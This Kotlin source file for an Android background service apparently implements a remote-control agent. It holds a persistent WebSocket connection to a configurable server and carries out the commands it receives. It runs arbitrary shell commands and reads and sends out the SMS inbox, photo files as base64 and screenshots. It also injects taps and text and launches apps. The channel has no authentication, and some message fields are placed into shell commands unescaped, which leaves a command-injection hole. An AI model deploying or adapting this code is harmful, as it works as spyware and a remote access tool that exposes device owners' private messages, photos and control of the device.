package com.remote.agent.service

import android.app.*
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import com.google.gson.Gson
import com.remote.agent.MainActivity
import com.remote.agent.R
import kotlinx.coroutines.*
import okhttp3.*
import java.io.File
import java.util.concurrent.TimeUnit

class AgentService : Service() {

    companion object {
        var isRunning = false
        const val TAG = "AgentService"
        const val CHANNEL_ID = "agent_channel"
    }

    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var ws: WebSocket? = null
    private var serverUrl = ""
    private var deviceName = ""
    private var deviceId = ""
    private var reconnecting = false

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serverUrl = intent?.getStringExtra("server") ?: return START_NOT_STICKY
        deviceName = intent.getStringExtra("deviceName") ?: android.os.Build.MODEL
        deviceId = getSharedPreferences("agent", MODE_PRIVATE)
            .getString("deviceId", null) ?: run {
            val id = java.util.UUID.randomUUID().toString()
            getSharedPreferences("agent", MODE_PRIVATE).edit().putString("deviceId", id).apply()
            id
        }

        startForeground(1, buildNotification("连接中..."))
        isRunning = true
        connect()
        startHeartbeat()
        return START_STICKY
    }

    private fun connect() {
        val url = "$serverUrl?type=agent&deviceId=$deviceId&name=${deviceName.replace(" ", "_")}"
        val client = OkHttpClient.Builder()
            .pingInterval(20, TimeUnit.SECONDS)
            .connectTimeout(10, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder().url(url).build()
        ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket 已连接")
                updateNotification("已连接到服务器 ✅")
                reconnecting = false
            }

            override fun onMessage(ws: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "连接失败: ${t.message}")
                updateNotification("连接中断，重连中...")
                scheduleReconnect()
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "连接关闭: $reason")
                scheduleReconnect()
            }
        })
    }

    private fun handleMessage(text: String) {
        try {
            val msg = gson.fromJson(text, Map::class.java) as Map<*, *>
            val type = msg["type"] as? String ?: return
            val clientId = msg["clientId"] as? String

            when (type) {
                "shell" -> {
                    val cmd = msg["cmd"] as? String ?: return
                    val output = execShell(cmd)
                    send(mapOf("type" to "shell_output", "output" to output, "clientId" to clientId, "cmd" to cmd))
                }
                "file_list" -> {
                    val path = msg["path"] as? String ?: "/sdcard"
                    val files = listFiles(path)
                    send(mapOf("type" to "file_list", "files" to files, "clientId" to clientId))
                }
                "tap" -> {
                    val x = (msg["x"] as? Double)?.toInt() ?: 0
                    val y = (msg["y"] as? Double)?.toInt() ?: 0
                    execShell("input tap $x $y")
                    send(mapOf("type" to "cmd_result", "cmd" to "tap $x $y", "result" to "ok", "clientId" to clientId))
                }
                "input_text" -> {
                    val t = (msg["text"] as? String)?.replace(" ", "%s") ?: return
                    execShell("input text $t")
                    send(mapOf("type" to "cmd_result", "cmd" to "input_text", "result" to "ok", "clientId" to clientId))
                }
                "launch_app" -> {
                    val pkg = msg["pkg"] as? String ?: return
                    execShell("monkey -p $pkg -c android.intent.category.LAUNCHER 1")
                    send(mapOf("type" to "cmd_result", "cmd" to "launch $pkg", "result" to "ok", "clientId" to clientId))
                }
                "sms_list" -> {
                    val limit = (msg["limit"] as? Double)?.toInt() ?: 20
                    val smsList = readSms(limit)
                    send(mapOf("type" to "sms_list", "messages" to smsList, "clientId" to clientId))
                }
                "photo_list" -> {
                    val limit = (msg["limit"] as? Double)?.toInt() ?: 50
                    val photos = getPhotoList(limit)
                    send(mapOf("type" to "photo_list", "photos" to photos, "clientId" to clientId))
                }
                "photo_get" -> {
                    val path = msg["path"] as? String ?: return
                    val base64 = getPhotoBase64(path)
                    send(mapOf("type" to "photo_data", "image" to base64, "path" to path, "clientId" to clientId))
                }
                "screenshot" -> {
                    val base64 = takeScreenshot()
                    send(mapOf("type" to "screenshot", "image" to base64, "clientId" to clientId))
                }
                "heartbeat_ack" -> { /* 忽略 */ }
            }
        } catch (e: Exception) {
            Log.e(TAG, "消息处理出错: ${e.message}")
        }
    }

    private fun execShell(cmd: String): String {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = proc.inputStream.bufferedReader().readText()
            val err = proc.errorStream.bufferedReader().readText()
            proc.waitFor()
            (out + err).take(4096)
        } catch (e: Exception) {
            "ERROR: ${e.message}"
        }
    }

    private fun readSms(limit: Int): List<Map<String, String>> {
        val smsList = mutableListOf<Map<String, String>>()
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date", "read"),
                null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    smsList.add(mapOf(
                        "address" to (it.getString(0) ?: ""),
                        "body" to (it.getString(1) ?: ""),
                        "date" to (it.getString(2) ?: ""),
                        "read" to (it.getString(3) ?: "0")
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            smsList.add(mapOf("error" to (e.message ?: "读取短信失败")))
        }
        return smsList
    }

    private fun getPhotoList(limit: Int): List<Map<String, String>> {
        val photos = mutableListOf<Map<String, String>>()
        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_ADDED
            )
            val cursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    photos.add(mapOf(
                        "id" to (it.getString(0) ?: ""),
                        "name" to (it.getString(1) ?: "unknown"),
                        "path" to (it.getString(2) ?: ""),
                        "size" to (it.getString(3) ?: "0"),
                        "date" to (it.getString(4) ?: "")
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            photos.add(mapOf("error" to (e.message ?: "读取相册失败")))
        }
        return photos
    }

    private fun getPhotoBase64(path: String): String {
        return try {
            val file = File(path)
            if (!file.exists()) return "ERROR: 文件不存在"
            if (file.length() > 5 * 1024 * 1024) return "ERROR: 文件过大(>5MB)"
            val bytes = file.readBytes()
            Base64.encodeToString(bytes, Base64.NO_WRAP)
        } catch (e: Exception) {
            "ERROR: ${e.message}"
        }
    }

    private fun takeScreenshot(): String {
        return try {
            val path = "${cacheDir.absolutePath}/screenshot.png"
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", "screencap -p $path"))
            proc.waitFor()
            val file = File(path)
            if (file.exists()) {
                val bytes = file.readBytes()
                file.delete()
                Base64.encodeToString(bytes, Base64.NO_WRAP)
            } else {
                "ERROR: 截图失败，可能需要ROOT权限"
            }
        } catch (e: Exception) {
            "ERROR: ${e.message}"
        }
    }

    private fun listFiles(path: String): List<Map<String, Any>> {
        return try {
            File(path).listFiles()?.map {
                mapOf("name" to it.name, "isDir" to it.isDirectory, "size" to if (it.isFile) it.length().toString() else "-")
            } ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    private fun send(data: Map<String, Any?>) {
        ws?.send(gson.toJson(data))
    }

    private fun startHeartbeat() {
        scope.launch {
            while (isActive) {
                delay(30_000)
                send(mapOf("type" to "heartbeat", "ts" to System.currentTimeMillis()))
            }
        }
    }

    private fun scheduleReconnect() {
        if (reconnecting) return
        reconnecting = true
        scope.launch {
            delay(5_000)
            connect()
        }
    }

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Agent 服务", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(text: String): Notification {
        val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE)
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Android Remote Agent")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pi)
            .build()
    }

    private fun updateNotification(text: String) {
        getSystemService(NotificationManager::class.java)
            .notify(1, buildNotification(text))
    }

    override fun onDestroy() {
        isRunning = false
        scope.cancel()
        ws?.close(1000, "Service stopped")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
